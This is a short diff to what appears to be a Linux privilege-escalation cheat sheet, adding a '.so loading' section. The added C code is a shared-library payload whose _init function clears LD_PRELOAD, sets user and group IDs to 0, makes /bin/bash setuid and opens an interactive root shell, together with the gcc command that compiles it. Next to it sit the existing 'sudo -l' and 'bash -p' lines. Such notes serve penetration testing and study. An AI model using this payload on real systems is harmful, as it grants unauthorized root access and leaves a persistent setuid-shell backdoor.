@@ -19,9 +19,29 @@ title: Linux
 sudo -l
 ```
 
+## .so loading
+```c
+#include <unistd.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("chmod u+s /bin/bash");
+    system("/bin/bash -i");
+}
+```
+
+```bash
+gcc -fPIC -shared -o extension.so extension.c -nostartfiles
+```
+
 ```bash
 bash -p
 ```
+
 
 ### ssh private key
 
